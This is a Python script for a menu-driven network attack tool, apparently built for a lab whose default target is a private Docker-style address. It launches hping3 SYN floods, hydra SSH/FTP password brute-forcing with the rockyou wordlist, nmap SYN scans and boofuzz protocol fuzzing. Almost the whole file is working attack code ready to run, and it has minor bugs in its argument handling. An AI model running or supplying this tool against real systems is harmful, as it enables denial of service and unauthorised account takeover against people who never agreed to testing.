import subprocess
from boofuzz import *
import os
import time


class Attack():
    def __init__(self,targetIP, targetPort, username_file="username.txt", password_file="rockyou.txt"):
        self.targetIP = targetIP
        self.targetPort = targetPort
        self.username_file = username_file
        self.password_file = password_file

    def dosAttack(self):
        print(f"[+] Launching hping3 flood against {self.targetIP}:{self.targetPort}...")
        # hping3 needs strings in the list. targetPort must be converted.
        cmd = ["hping3", "-S", "-p", str(self.targetPort), "--flood", self.targetIP]
        try:
            # Popen runs in the background. 
            # Note: This will run forever until you close the terminal or kill the PID.
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"[!] Attack running in background. PID: {process.pid}")
            time.sleep(10)
            process.terminate()
            print(f"[+] Attack stopped after 10 seconds.")
            return process
        except Exception as e:
            print(f"Error: {e}")

    def bruteForce(self):
        print(f"[+] Starting Hydra brute force on {self.targetIP}:{self.targetPort}...")
        
        # Determine protocol based on port
        protocol = "ssh" if int(self.targetPort) == 22 else "ftp"
        
        # Hydra command: -L for user list OR -l for single user. 
        # Since 'username' here is likely a single string, we use -l
        cmd = ["hydra", "-l", self.username_file, "-P", self.password_file, "-f", self.targetIP, "-s", str(self.targetPort), protocol]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Error running Hydra: {e}")


    def portScanner(self,targetIP, maxPort):
        print(f"[+] Scanning {targetIP} up to port {maxPort}...")
        # Fixed the f-string and variable name
        cmd = ["nmap", "-sS", "-p", f"1-{maxPort}", targetIP]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Error running Nmap: {e}")

    def boofuzzNetwork(self):
        print(f"[+] Initializing Boofuzz stateful fuzzer against {self.targetIP}:{self.targetPort}...")
        
        session = Session(
            target=Target(
                connection=TCPSocketConnection(self.targetIP, int(self.targetPort))
            ),
        )

        if str(self.targetPort) == "22":
            s_initialize("ssh_fuzz_request")
            if s_block("ssh_header"):
                s_static("SSH-2.0-")
                s_string("OpenSSH_8.2p1", name="version_string")
                s_static("\r\n")
                if s_block("payload_body"):
                    s_group("methods", ["AUTH", "LOGIN", "SHELL"])
                    s_delim(" ")
                    s_string("admin", name="user_fuzz")
                    s_static("\r\n")
            s_block_end() # Close payload_body
            s_block_end() # Close ssh_header
            session.connect(s_get("ssh_fuzz_request"))

        elif str(self.targetPort) == "21":
            s_initialize("ftp_login_fuzz")
            if s_block("ftp_commands"):
                s_group("verbs", ["USER", "PASS", "CWD", "STOR", "RETR", "DELE"])
                s_delim(" ")
                s_string("anonymous", name="ftp_arg")
                s_static("\r\n")
            s_block_end()
            session.connect(s_get("ftp_login_fuzz"))
        
        else:
            print(f"[-] No specific fuzzer for port {self.targetPort}. Defaulting to generic TCP.")
            s_initialize("generic_tcp")
            s_string("FUZZ_DATA")
            s_block_end()
            session.connect(s_get("generic_tcp"))

        print(f"[!] Fuzzing started. Access the dashboard at http://127.0.0.1:26000")
        session.fuzz()

def main():
    while True:
        print("\n==== Attack Menu ====")
        print("1. Exit")
        print("2. DOS Attack (hping3)")
        print("3. Port Scanning (nmap)")
        print("4. Brute Force (hydra)")
        print("5. Fuzzer Attack (boofuzz)")
        
        choice = input("Enter your choice: ").strip()


        if choice == "1":
            print("Exiting...")
            break

        elif choice == "2":
            targetIP = input("Enter target IP: ") or "172.17.0.5"
            targetPort = input("Enter target Port: ") or "80"
            attack1 = Attack(targetIP, targetPort)
            attack1.dosAttack()

        elif choice == "3":
            targetIP = input("Enter target IP: ") or "172.17.0.5"
            max_port = input("Scan ports from 1 to (default 100): ") or "100"
            attack2 = Attack(targetIP, 0) # Port 0 placeholder
            attack2.portScanner(targetIP, max_port) # Pass parameters here

        elif choice == "4":
            targetIP = input("Enter target IP: ") or "172.17.0.5"
            targetPort = input("Enter target Port (22/21): ") or "22"
            user = input("Enter username: ") or "root"
            wordlist = input("Enter path to wordlist: ") or "rockyou.txt"
            attack3 = Attack(targetIP, targetPort,user,wordlist)
            attack3.bruteForce()

        elif choice == "5":
            targetIP = input("Enter target IP: ") or "172.17.0.5"
            targetPort = input("Enter target Port (22/21): ") or "80"
            attack4 = Attack(targetIP, targetPort)
            attack4.boofuzzNetwork()

        else:
            print("Invalid choice.")

if __name__ == "__main__":
    main()
